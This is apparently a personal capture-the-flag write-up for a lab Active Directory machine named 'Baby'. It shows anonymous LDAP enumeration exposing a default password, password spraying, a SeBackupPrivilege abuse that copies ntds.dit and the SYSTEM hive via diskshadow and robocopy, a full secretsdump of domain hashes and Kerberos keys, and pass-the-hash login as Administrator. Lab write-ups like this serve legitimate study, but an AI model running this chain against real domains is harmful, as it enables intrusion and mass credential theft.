


# Foothold



ldap enum

```
ldapsearch -x -H ldap://10.10.103.254 -D '' -w '' -b "DC=baby,DC=vl" | grep dn:

dn: DC=baby,DC=vl
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
dn: CN=dev,CN=Users,DC=baby,DC=vl
dn: CN=it,CN=Users,DC=baby,DC=vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl

```

```
ldapsearch -x -H ldap://10.10.103.254 -D '' -w '' -b "DC=baby,DC=vl" | grep description:
description: All workstations and servers joined to the domain
description: Members of this group are permitted to publish certificates to th
description: All domain users
description: All domain guests
description: Members in this group can modify group policy for the domain
description: Servers in this group can access remote access properties of user
description: Members in this group can have their passwords replicated to all 
description: Members in this group cannot have their passwords replicated to a
description: Members of this group are Read-Only Domain Controllers in the ent
description: Members of this group that are domain controllers may be cloned.
description: Members of this group are afforded additional protections against
description: DNS Administrators Group
description: DNS clients who are permitted to perform dynamic updates on behal
description: Built-in account for guest access to the computer/domain
description: Set initial password to BabyStart123!
```



```
nxc smb 10.10.10.6 -u users.txt -p 'BabyStart123!' --no-bruteforce
...
SMB         10.10.10.6      445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANG
```


we can now change password on the user

```
smbpasswd -r 10.10.103.254 -U Caroline.Robinson
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson
```




```
smbpasswd -r 10.10.103.254 -U Caroline.Robinson
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user Caroline.Robinson
```

![[Pasted image 20240210152846.png]]



# Privesc

```
*Evil-WinRM* PS C:\users\Caroline.Robinson\desktop> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1111


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

```

![[Pasted image 20240210154302.png]]


```
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cd /

*Evil-WinRM* PS C:\> mkdir Temp

*Evil-WinRM* PS C:\> 

*Evil-WinRM* PS C:\> cd C:\Temp

*Evil-WinRM* PS C:\Temp> upload /home/suljov/Desktop/raj.dsh
```

```
*Evil-WinRM* PS C:\Temp> diskshadow /s raj.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  2/10/2024 2:30:15 PM

-> set context persistent nowriters
-> add volume c: alias raj
-> create
Alias raj for shadow ID {5b312457-6974-4d0b-9bc4-82ab65bbbefb} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {03cf565e-ba45-4791-871a-f7c8100f1610} set as environment variable.

Querying all shadow copies with the shadow copy set ID {03cf565e-ba45-4791-871a-f7c8100f1610}

	* Shadow copy ID = {5b312457-6974-4d0b-9bc4-82ab65bbbefb}		%raj%
		- Shadow copy set: {03cf565e-ba45-4791-871a-f7c8100f1610}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\]
		- Creation time: 2/10/2024 2:30:16 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: BabyDC.baby.vl
		- Service machine: BabyDC.baby.vl
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %raj% z:
-> %raj% = {5b312457-6974-4d0b-9bc4-82ab65bbbefb}
The shadow copy was successfully exposed as z:\.
->
->
->

```

```
*Evil-WinRM* PS C:\Temp> robocopy /b z:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Saturday, February 10, 2024 2:30:20 PM
   Source : z:\windows\ntds\
     Dest : C:\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                   1	z:\windows\ntds\
	    New File  		  16.0 m	ntds.dit
  0.0%
  0.3%
  0.7%
  1.1%
  1.5%

<SNIP>

 96.0%
 96.4%
 96.8%
 97.2%
 97.6%
 98.0%
 98.4%
 98.8%
 99.2%
 99.6%
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           30,671,327 Bytes/sec.
   Speed :            1,755.027 MegaBytes/min.
   Ended : Saturday, February 10, 2024 2:30:21 PM


```


```
*Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> ls


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/10/2024   2:30 PM            618 2024-02-10_14-30-16_BABYDC.cab
-a----         2/10/2024   2:21 PM       16777216 ntds.dit
-a----         2/10/2024   2:30 PM             88 raj.dsh
-a----         2/10/2024   2:30 PM       16625664 system

```

```
*Evil-WinRM* PS C:\Temp> download ntds.dit
                                        
Info: Downloading C:\Temp\ntds.dit to ntds.dit
                                        
Info: Download successful!

```


```
*Evil-WinRM* PS C:\Temp> download system
                                        
Info: Downloading C:\Temp\system to system
                                        
Info: Download successful!
```


```
secretsdump.py -ntds ntds.dit -system system local

Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:2746afd50b85da49a7b66d56f8c2b856:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Caroline.Robinson:1111:aad3b435b51404eeaad3b435b51404ee:5fa67a134024d41bb4ff8bfd7da5e2b5:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
BABYDC$:aes256-cts-hmac-sha1-96:a974b72dc7706bd674b6b7d141226cbe877aa0355507154d4c1884070e435c62
BABYDC$:aes128-cts-hmac-sha1-96:20ab089d98dafefb9bd8cca0cc4ef79c
BABYDC$:des-cbc-md5:08c7757a85b39268
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
krbtgt:des-cbc-md5:d57383f1b3130de5
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7
baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c
baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:6fe5d46e01d6cf9909f479fb4d7afac0bd973981dd958e730a734aa82c9e13af
baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:f34e6c0c8686a46eea8fd15a361601f9
baby.vl\Caroline.Robinson:des-cbc-md5:fd40190d579138df
baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
[*] Cleaning up... 

```


login as administrator with the hash

```
evil-winrm -i 10.10.103.254 -u Administrator -H <REDACTED>


                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
baby\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : eu-central-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::4c28:8fa2:ebad:5c54%7
   IPv4 Address. . . . . . . . . . . : 10.10.103.254
   Subnet Mask . . . . . . . . . . . : 255.255.192.0
   Default Gateway . . . . . . . . . : 10.10.64.1

```


![[Pasted image 20240210153705.png]]

